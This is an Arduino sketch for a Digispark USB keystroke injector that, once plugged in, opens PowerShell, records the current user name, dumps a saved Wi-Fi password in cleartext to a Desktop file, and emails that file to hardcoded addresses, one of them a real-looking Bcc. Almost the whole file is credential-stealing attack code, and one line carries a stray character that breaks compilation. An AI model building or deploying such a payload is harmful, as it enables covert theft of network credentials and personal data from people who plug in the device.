#include "DigiKeyboard.h"

void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // Escape characters that need to be within the string literal
  DigiKeyboard.print("Get-LocalUser -Name $env:USERNAME* | Select-Object Name | Out-File \"C:\\Users\\$env:USERNAME\\Desktop\\extracted.txt\"");t
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  DigiKeyboard.print("netsh wlan show profiles name=LAN key=clear | Select-String 'Key Content' -Context 0 >>  \"C:\\Users\\$env:USERNAME\\Desktop\\extracted.txt\"");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  // Escape double quotes within the string literal
  DigiKeyboard.print("Send-MailMessage -From other999@proton.me -Subject \"Test Mail\" -To other999@proton.me -Attachments C:\\users\\$env:USERNAME\\Desktop\\extracted.txt -Bcc abrander@rocfriesepoort.nl -Credential koetsier.k@proton.me -Port 1025 -SmtpServer 127.0.0.1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  for (;;) {
    // Infinite loop to prevent the script from ending
  }
}
